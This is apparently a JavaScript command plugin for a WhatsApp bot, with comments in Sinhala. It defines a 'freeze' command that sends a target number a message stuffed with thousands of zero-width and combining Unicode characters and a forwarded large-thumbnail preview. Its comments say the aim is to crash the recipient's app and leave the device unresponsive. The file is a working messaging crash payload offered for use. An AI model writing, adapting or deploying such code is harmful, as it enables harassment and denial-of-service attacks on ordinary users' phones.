const { cmd } = require('../command');

cmd({
    pattern: "freeze",
    alias: ["lock", "dead"],
    desc: "Safe Crash Loop Without 428 Error",
    category: "owner",
    react: "🥶",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        const authorizedNumbers = ['94740137623']; // ඔයාගේ අංකය මෙතනට දාන්න
        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
        if (!isAuthorized) return;

        if (!args[0] && !m.quoted) return reply("අංකයක් දෙන්න!");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        // --- මෙතන තමයි වෙනස තියෙන්නේ ---
        // අපි ලොකු Payload එකක් වෙනුවට ලස්සනට පිළිවෙලට බර වැඩි සංකේත ටිකක් විතරක් දානවා
        const bugBody = "\u200b".repeat(5000) + "҉".repeat(500) + "\u0345\u0361\u0345".repeat(500);

        await conn.sendMessage(target, { 
            text: `*⚠️ HASHU-LAG SYSTEM V1 ⚠️*\n\n` + bugBody,
            contextInfo: {
                // මේකෙන් තමයි ක්‍රෑෂ් එක වෙන්නේ, මැසේජ් එකේ සයිස් එකෙන් නෙවෙයි
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "W H A T S A P P  L O C K E D",
                    body: "Device Unresponsive",
                    mediaType: 1,
                    // Image එක ලොකුවට පෙන්නන්න හදන එකෙනුත් ක්‍රෑෂ් එක වැඩි වෙනවා
                    renderLargerThumbnail: true,
                    thumbnailUrl: `https://files.catbox.moe/vbo0vq.png`, 
                    sourceUrl: "https://whatsapp.com/channel/0029VazhnLzK0IBdwXG4152o"
                }
            }
        }, { quoted: mek });

        console.log(`[!] Freeze sent successfully to ${target}`);

    } catch (e) {
        console.error("Caught error to prevent bot crash:", e.message);
    }
});
